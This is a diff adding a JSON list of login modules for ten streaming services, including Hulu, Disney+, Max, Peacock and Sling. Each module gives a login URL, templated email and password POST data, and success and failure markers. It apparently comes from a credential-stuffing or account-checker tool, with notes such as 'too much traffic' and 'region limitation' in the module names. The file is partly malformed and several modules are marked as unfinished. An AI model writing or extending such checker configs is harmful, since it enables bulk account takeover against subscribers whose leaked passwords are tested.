@@ -1,0 +1,180 @@
+{
+
+    "module_name": "Hulu  Needs confirmation",
+    "login_url": "https://auth.hulu.com/web/login",
+    "method": "POST",
+    "price": 0,
+    "requires_captcha": true,
+    "multiform": false,
+    "headers": {
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0"
+    },
+    "post_data": "email-field={email}&password={password}",
+    "success_key": "csrf_token",
+    "fail_key": "Incorrect username or password",
+    "retry_key": "",
+    "extra_attributes": {}
+  },
+
+   {
+    "module_name": "Max create puzzle to fix first",
+    "login_url": "https://www.max.com/login",
+    "method": "POST",
+    "price": 0,
+    "requires_captcha": true,
+    "multiform": false,
+    "headers": {
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0"
+    },
+    "post_data": "email={email}&password={password}",
+    "success_key": "token",
+    "fail_key": "error_code",
+    "retry_key": "",
+    "extra_attributes": {}
+  },
+
+
+  {
+    "module_name": "Disney+ region limitation",
+    "login_url": "https://www.disneyplus.com/login",
+    "method": "POST",
+    "price": 0,
+    "requires_captcha": true,
+    "multiform": false,
+    "headers": {
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0"
+    },
+    "post_data": "username={email}&password={password}",
+    "success_key": "token",
+    "fail_key": "errorCode",
+    "retry_key": "",
+    "extra_attributes": {}
+  },
+
+   {
+    "module_name": "DirecTV error, not sure what it is",
+    "login_url": "https://www.directv.com/directv-login/",
+    "method": "POST",
+    "price": 0,
+    "requires_captcha": true,
+    "multiform": false,
+    "headers": {
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0"
+    },
+    "post_data": "userName={email}&password={password}",
+    "success_key": "authenticationToken",
+    "fail_key": "CREDENTIALS_INVALID",
+    "retry_key": "",
+    "extra_attributes": {}
+  },
+
+  {
+    "module_name": "Peacock asks for plan after email",
+    "login_url": "https://www.peacocktv.com/login",
+    "method": "POST",
+    "price": 0,
+    "requires_captcha": true,
+    "multiform": false,
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0"
+    },
+    "post_data": "username={email}&password={password}",
+    "success_key": "accessToken",
+    "fail_key": "invalid_grant",
+    "retry_key": "",
+    "extra_attributes": {}
+  },
+
+  {
+    "module_name": "Paramount+ to plan",
+    "login_url": "https://www.paramountplus.com/login",
+    "method": "POST",
+    "price": 0,
+    "requires_captcha": true,
+    "multiform": false,
+    "headers": {
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0"
+    },
+    "post_data": "username={email}&password={password}",
+    "success_key": "user",
+    "fail_key": "error",
+    "retry_key": "",
+    "extra_attributes": {}
+  },
+
+  {
+    "module_name": "Sling error",
+    "login_url": "https://www.sling.com/login",
+    "method": "POST",
+    "price": 0,
+    "requires_captcha": true,
+    "multiform": false,
+    "headers": {
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0"
+    },
+    "post_data": "username={email}&password={password}&grant_type=password",
+    "success_key": "access_token",
+    "fail_key": "invalid_grant",
+    "retry_key": "",
+    "extra_attributes": {}
+  },
+
+   {
+    "module_name": "MGM+ too much traffic",
+    "login_url": "https://www.mgmplus.com/login",
+    "method": "POST",
+    "price": 0,
+    "requires_captcha": true,
+    "multiform": false,
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0"
+    },
+    "post_data": "email={email}&password={password}",
+    "success_key": "Logout",
+    "fail_key": "Invalid email or password",
+    "retry_key": "",
+    "extra_attributes": {}
+  },
+  {
+    "module_name": "Fox Nation too much traffic",
+    "login_url": "https://www.foxnation.com/login",
+    "method": "POST",
+    "price": 0,
+    "requires_captcha": true,
+    "multiform": false,
+    "headers": {
+      "Content-Type": "application/json",
+      "User-Agent": "Mozilla/5.0"
+    },
+    "post_data": "email={email}&password={password}",
+    "success_key": "token",
+    "fail_key": "Invalid login",
+    "retry_key": "",
+    "extra_attributes": {}
+  },
+
+  {
+    "module_name": "Hallmark+ complicated",
+    "login_url": "https://www.hallmarkchannel.com/login",
+    "method": "POST",
+    "price": 0,
+    "requires_captcha": false,
+    "multiform": false,
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "Mozilla/5.0"
+    },
+    "post_data": "email={email}&password={password}",
+    "success_key": "logout",
+    "fail_key": "Invalid login",
+    "retry_key": "",
+    "extra_attributes": {}
+  },
